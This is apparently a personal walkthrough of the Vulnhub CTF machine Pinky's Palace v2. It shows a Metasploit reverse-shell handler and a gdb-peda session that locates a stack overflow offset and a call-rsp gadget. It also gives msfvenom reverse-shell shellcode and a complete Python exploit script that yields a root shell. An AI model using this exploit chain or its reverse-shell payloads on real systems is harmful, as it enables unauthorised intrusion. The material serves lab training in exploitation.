-- Creating the Exploit --



Download the Executable --

root@7242-alpha-reticuli:~# msfconsole -q -x "use exploit/multi/handler; set LHOST 192.168.1.116; set LPORT 31338; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set ExitOnSession false ; exploit -j -z"
LHOST => 192.168.1.116
LPORT => 31338
PAYLOAD => linux/x64/meterpreter/reverse_tcp
ExitOnSession => false
[*] Exploit running as background job 0.

[*] Started reverse TCP handler on 192.168.1.116:31338 
msf exploit(multi/handler) > [*] Sending stage (812100 bytes) to 192.168.1.119
[*] Meterpreter session 1 opened (192.168.1.116:31338 -> 192.168.1.119:57400) at 2018-06-11 21:39:23 -0500
sessions 1
[*] Starting interaction with 1...

meterpreter > download /daemon/panel
[*] Downloading: /daemon/panel -> panel
[*] Downloaded 12.97 KiB of 12.97 KiB (100.0%): /daemon/panel -> panel
[*] download   : /daemon/panel -> panel
meterpreter >

Overflow the App --

root@7242-alpha-reticuli:~/Downloads# gdb ./panel
GNU gdb (Debian 7.12-6+b2) 7.12.0.20161007-git
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ./panel...(no debugging symbols found)...done.
gdb-peda$ r
Starting program: /root/Downloads/panel 
[New process 800]

Thread 2.1 "panel" received signal SIGSEGV, Segmentation fault.
[Switching to process 800]

[----------------------------------registers-----------------------------------]
RAX: 0xc9 
RBX: 0x0 
RCX: 0x7ffff7b1607d (<__libc_send+29>:	cmp    rax,0xfffffffffffff000)
RDX: 0xc9 
RSI: 0x7fffffffd4d0 ('A' <repeats 200 times>...)
RDI: 0x4 
RBP: 0x4141414141414141 ('AAAAAAAA')
RSP: 0x7fffffffd548 ('A' <repeats 80 times>, "\n")
RIP: 0x4009aa (<handlecmd+70>:	ret)
R8 : 0x0 
R9 : 0x0 
R10: 0x0 
R11: 0x246 
R12: 0x400840 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe680 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x10207 (CARRY PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x4009a3 <handlecmd+63>:	call   0x400790 <send@plt>
   0x4009a8 <handlecmd+68>:	nop
   0x4009a9 <handlecmd+69>:	leave  
=> 0x4009aa <handlecmd+70>:	ret    
   0x4009ab <main>:	push   rbp
   0x4009ac <main+1>:	mov    rbp,rsp
   0x4009af <main+4>:	sub    rsp,0x1050
   0x4009b6 <main+11>:	call   0x400820 <fork@plt>
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffd548 ('A' <repeats 80 times>, "\n")
0008| 0x7fffffffd550 ('A' <repeats 72 times>, "\n")
0016| 0x7fffffffd558 ('A' <repeats 64 times>, "\n")
0024| 0x7fffffffd560 ('A' <repeats 56 times>, "\n")
0032| 0x7fffffffd568 ('A' <repeats 48 times>, "\n")
0040| 0x7fffffffd570 ('A' <repeats 40 times>, "\n")
0048| 0x7fffffffd578 ('A' <repeats 32 times>, "\n")
0056| 0x7fffffffd580 ('A' <repeats 24 times>, "\n")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x00000000004009aa in handlecmd ()
gdb-peda$ 

root@7242-alpha-reticuli:~/Downloads# python -c 'print "A"*200' | nc -v localhost 31337
localhost [127.0.0.1] 31337 (?) open
[+] Welcome to The Daemon [+]
This is soon to be our backdoor
into Pinky's Palace.
=> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
^C

Pattern Creata and find actual mem location --

gdb-peda$ pattern_create 200
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'
gdb-peda$ 

Re-run ./panel and do it by hand with the new payload --

root@7242-alpha-reticuli:~/Downloads# pkill panel ; ps -ef | grep panel
root       974 26015  0 11:19 pts/15   00:00:00 grep panel
root@7242-alpha-reticuli:~/Downloads# 

root@7242-alpha-reticuli:~/Downloads# gdb ./panel
GNU gdb (Debian 7.12-6+b2) 7.12.0.20161007-git
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ./panel...(no debugging symbols found)...done.
gdb-peda$ r
Starting program: /root/Downloads/panel 
[New process 1021]

Thread 2.1 "panel" received signal SIGSEGV, Segmentation fault.
[Switching to process 1021]

[----------------------------------registers-----------------------------------]
RAX: 0xc9 
RBX: 0x0 
RCX: 0x7ffff7b1607d (<__libc_send+29>:	cmp    rax,0xfffffffffffff000)
RDX: 0xc9 
RSI: 0x7fffffffd4d0 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"...)
RDI: 0x4 
RBP: 0x41414e4141384141 ('AA8AANAA')
RSP: 0x7fffffffd548 ("jAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n")
RIP: 0x4009aa (<handlecmd+70>:	ret)
R8 : 0x0 
R9 : 0x0 
R10: 0x0 
R11: 0x246 
R12: 0x400840 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe680 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x10207 (CARRY PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x4009a3 <handlecmd+63>:	call   0x400790 <send@plt>
   0x4009a8 <handlecmd+68>:	nop
   0x4009a9 <handlecmd+69>:	leave  
=> 0x4009aa <handlecmd+70>:	ret    
   0x4009ab <main>:	push   rbp
   0x4009ac <main+1>:	mov    rbp,rsp
   0x4009af <main+4>:	sub    rsp,0x1050
   0x4009b6 <main+11>:	call   0x400820 <fork@plt>
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffd548 ("jAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n")
0008| 0x7fffffffd550 ("AkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n")
0016| 0x7fffffffd558 ("AAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n")
0024| 0x7fffffffd560 ("RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n")
0032| 0x7fffffffd568 ("ApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n")
0040| 0x7fffffffd570 ("AAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n")
0048| 0x7fffffffd578 ("VAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n")
0056| 0x7fffffffd580 ("AuAAXAAvAAYAAwAAZAAxAAyA\n")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x00000000004009aa in handlecmd ()
gdb-peda$ 


root@7242-alpha-reticuli:~/Downloads# nc -v localhost 31337
localhost [127.0.0.1] 31337 (?) open
[+] Welcome to The Daemon [+]
This is soon to be our backdoor
into Pinky's Palace.
=> AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA
^C
root@7242-alpha-reticuli:~/Downloads#

Find Exact Offset --

gdb-peda$ pattern_offset jAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA
jAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA found at offset: 120
gdb-peda$ 


Ref Url --
https://d7x.promiselabs.net/2018/04/10/ctf-pinkys-palace-v2-hard-vulnhub-ctf-walkthrough/

So now we have to find a return address, which we would then put after to offset in order to jump to the beginning of the string sent over, which is actually stored into the RSP register. Usually we would want to override the RIP register which contains the next instruction, but in this case the RBP is something like a temporary location to it, which is again explained in the video below. So we actually override the contents of RBP with a return address which would point to the beginning of RSP, where we could put our shellcode. To search for a jmp instruction within the application type “jmpcall” into gdb-peda’s command line interface: 

There’s a call rsp instruction located at address 0x400cfb which would be our return address for the exploit. As there is 120 bytes of shellcode space to work with, and a linux reverse shell on a 64 bit platform (generated using msfvenom) takes 119 bytes we could use the linux/x64/shell_reverse_tcp payload: 

gdb-peda$ pattern_offset jAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA
jAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA found at offset: 120
gdb-peda$ jmpcall 
0x400728 : call rax
0x400895 : jmp rax
0x4008e3 : jmp rax
0x40092e : call rax
0x400cfb : call rsp
0x400d6b : call [rax]
gdb-peda$ x/i 0x400cfb
   0x400cfb:	call   rsp
gdb-peda$ 

Create our Reverse Shell Code --

root@7242-alpha-reticuli:~/Downloads# msfvenom -a x64 -p linux/x64/shell_reverse_tcp LHOST=192.168.1.116 LPORT=31339 -b 00 -f python
No platform was selected, choosing Msf::Module::Platform::Linux from the payload
Found 2 compatible encoders
Attempting to encode payload with 1 iterations of generic/none
generic/none failed with Encoding failed due to a bad character (index=17, char=0x00)
Attempting to encode payload with 1 iterations of x64/xor
x64/xor succeeded with size 119 (iteration=0)
x64/xor chosen with final size 119
Payload size: 119 bytes
Final size of python file: 586 bytes
buf =  ""
buf += "\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d\x05"
buf += "\xef\xff\xff\xff\x48\xbb\xd8\xba\xf4\xd7\x7d\x4a\x03"
buf += "\x38\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4"
buf += "\xb2\x93\xac\x4e\x17\x48\x5c\x52\xd9\xe4\xfb\xd2\x35"
buf += "\xdd\x4b\x81\xda\xba\x8e\xbc\xbd\xe2\x02\x4c\x89\xf2"
buf += "\x7d\x31\x17\x5a\x59\x52\xf2\xe2\xfb\xd2\x17\x49\x5d"
buf += "\x70\x27\x74\x9e\xf6\x25\x45\x06\x4d\x2e\xd0\xcf\x8f"
buf += "\xe4\x02\xb8\x17\xba\xd3\x9a\xf8\x0e\x22\x03\x6b\x90"
buf += "\x33\x13\x85\x2a\x02\x8a\xde\xd7\xbf\xf4\xd7\x7d\x4a"
buf += "\x03\x38"
root@7242-alpha-reticuli:~/Downloads# 

Modified Exploit Code --

11:39:14-cdowns@7242-alpha-reticuli:~/Documents/Vulnhub$ cat Panel_Overflow.py 
import socket
from time import sleep

buf =  ""
buf += "\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d\x05"
buf += "\xef\xff\xff\xff\x48\xbb\xd8\xba\xf4\xd7\x7d\x4a\x03"
buf += "\x38\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4"
buf += "\xb2\x93\xac\x4e\x17\x48\x5c\x52\xd9\xe4\xfb\xd2\x35"
buf += "\xdd\x4b\x81\xda\xba\x8e\xbc\xbd\xe2\x02\x4c\x89\xf2"
buf += "\x7d\x31\x17\x5a\x59\x52\xf2\xe2\xfb\xd2\x17\x49\x5d"
buf += "\x70\x27\x74\x9e\xf6\x25\x45\x06\x4d\x2e\xd0\xcf\x8f"
buf += "\xe4\x02\xb8\x17\xba\xd3\x9a\xf8\x0e\x22\x03\x6b\x90"
buf += "\x33\x13\x85\x2a\x02\x8a\xde\xd7\xbf\xf4\xd7\x7d\x4a"
buf += "\x03\x38"

ret = "\xfb\x0c\x40\x00"

payload = "A"*(120-len(buf)) + buf + ret

#HOST = '127.0.0.1' 
HOST = '192.168.1.119'
PORT = 31337 

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
sleep(1)
data = s.recv(1024)
print data
s.send(payload)
print s.recv(1024)
s.close()
11:39:24-cdowns@7242-alpha-reticuli:~/Documents/Vulnhub$ 

Exploit the Target !!! --

root@7242-alpha-reticuli:/home/cdowns/Documents/Vulnhub# python Panel_Overflow.py 
[+] Welcome to The Daemon [+]
This is soon to be our backdoor
into Pinky's Palace.
=> 
AH1�H������H�����H�غ��}J8H1X'H-���������NH\R����5�K�ں����L��}1ZYR����I]p't��%EM.�Ϗ���Ӛ�"k�3�*��׿��}J8�
                                                                                                                  @
root@7242-alpha-reticuli:/home/cdowns/Documents/Vulnhub# 


root@7242-alpha-reticuli:~# nc -nlvp 31339
listening on [any] 31339 ...
connect to [192.168.1.116] from (UNKNOWN) [192.168.1.119] 37070
id
uid=0(root) gid=0(root) groups=0(root)
cat /root/root.txt

 ____  _       _          _     
|  _ \(_)_ __ | | ___   _( )___ 
| |_) | | '_ \| |/ / | | |// __|
|  __/| | | | |   <| |_| | \__ \
|_|   |_|_| |_|_|\_\\__, | |___/
                    |___/       
 ____       _                   
|  _ \ __ _| | __ _  ___ ___ 
| |_) / _` | |/ _` |/ __/ _ \
|  __/ (_| | | (_| | (_|  __/
|_|   \__,_|_|\__,_|\___\___|

[+] CONGRATS YOUVE PWND PINKYS PALACE!!!!!!                             
[+] Flag: 2208f787fcc6433b4798d2189af7424d
[+] Twitter: @Pink_P4nther
[+] Cheers to VulnHub!
[+] VM Host: VMware
[+] Type: CTF || [Realistic]
[+] Hopefully you enjoyed this and gained something from it as well!!!


DONE !!!!

Rewritten in GO !!! --
https://github.com/cdowns71/stuffz/blob/master/PPv2_Panel_Exploit.go




